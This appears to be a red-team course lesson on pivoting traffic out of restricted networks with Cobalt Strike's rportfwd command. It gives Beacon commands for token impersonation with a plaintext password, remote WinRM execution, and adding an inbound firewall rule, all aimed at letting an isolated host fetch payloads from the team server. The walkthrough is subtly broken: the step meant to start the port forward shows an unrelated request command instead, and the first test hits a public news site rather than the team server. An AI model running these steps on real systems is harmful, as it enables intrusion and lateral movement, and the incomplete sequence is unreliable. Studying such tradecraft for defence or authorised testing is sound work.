
I find it useful to think of reverse port forwards as the opposite of of SOCKS.  Rather than tunnelling traffic in from the outside, a reverse port forward allows an adversary to tunnel traffic out from the inside.  Some computers, such as servers, are often restricted from sending traffic onto the Internet or out of their network segment.  Reverse port forwards allow these restrictions to be circumvented by pivoting the traffic through a Beacon to which the computer can communicate with.

The syntax of the `rportfwd` command is `rportfwd [bind port] [forward host] [forward port]`.

- This instructs the Beacon to begin listening on the _bind port_.  Any traffic that hits this port is sent back to the team server over the C2 channel.
    
- The team server will forward the traffic to the _forward host_ and _forward port_.
    
- If there is a response, the team server will send it back to Beacon over the C2 channel.
    
- Beacon then forwards that response to the original caller.
    

One scenario where the reverse port forward can be useful is when you have remote command execution on a target computer, but no ability to upload a payload to it.  In those cases, tricks like PowerShell download cradles are good because you command the computer to download the payload from a remote resource.  However, as mentioned, that computer may not have Internet access to pull it from anywhere.  This can be circumvented by starting a reverse port forward on a Beacon that the target computer can talk to.

First, let's demonstrate that _lon-ws-1_ cannot download a file directly from the team server.

```powershell
beacon> make_token CONTOSO\rsteel Passw0rd!
beacon> remote-exec winrm lon-ws-1 iwr http://www.bleepincomputer.com/test
```

This will return the error:  "Unable to connect to the remote server".

Running a reverse port forward in itself does not necessarily require local admin access because standard users are allowed to bind to high ports.  Binding to common ports such as 80, 443, 8080, etc, will require local admin access.  The bigger hurdle is the inbound firewall rules on the computer Beacon is running on because it will block all inbound traffic by default, unless an explicit allow rule is added.  And you do need local admin access for that.

First, add a firewall rule to allow port 28190 inbound.

```powershell
beacon> run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
```

Then start the reverse port forward on that port.  We'll have the team server forward the traffic to itself on port 80 (where it will hit its own internal web server).

```powershell
beacon> remote-exec winrm lon-ws-1 iwr http://lon-wkstn-1:28190/test
```

This time it will return a 404 and we'll see a corresponding record in Cobalt Strike's web log (**View > Web Log**).

```powershell
02/19 11:09:44 visit (port 80) from: 127.0.0.1
	Request: GET /test
	Response: 404 Not Found
	Mozilla/5.0 (Windows NT; Windows NT 10.0; en-GB) WindowsPowerShell/5.1.20348.2849
```

To clean-up, we'd simply stop the reverse port forward and remove the firewall rule.

```powershell
beacon> rportfwd stop 28190
beacon> run netsh advfirewall firewall delete rule name="Debug"
```